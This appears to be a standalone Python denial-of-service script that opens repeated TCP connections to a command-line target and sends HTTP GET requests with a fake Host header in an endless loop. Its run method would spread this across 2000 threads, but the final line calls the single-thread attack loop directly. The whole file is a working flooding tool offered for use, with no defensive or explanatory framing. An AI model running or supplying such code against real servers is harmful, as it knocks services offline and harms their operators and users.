#! /usr/bin/env python3

import socket
import threading
import sys

class DenialOfService(object):
    def __init__(self, target , port, ip_mask="182.21.20.32"):
        self.target = target
        self.port = port
        self.ip_mask = ip_mask
        

    def run(self):
        for i in range(2000):
            thread = threading.Thread(target=self.attack).start()


    def attack(self):
        h=0
        while True:
            h+=1
            print(f"\033[100m DDOS \033[0m {self.target} {self.port} {h}")
            connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            connection.connect((self.target, self.port))
            connection.sendto((f"GET /{self.target} HTTP/1.1\r\n").encode("ascii"), (self.target, self.port))
            connection.sendto((f"Host: {self.ip_mask}\r\n\r\n").encode("ascii"), (self.target, self.port))
            connection.close()


DenialOfService(sys.argv[1],int(sys.argv[2])).attack()

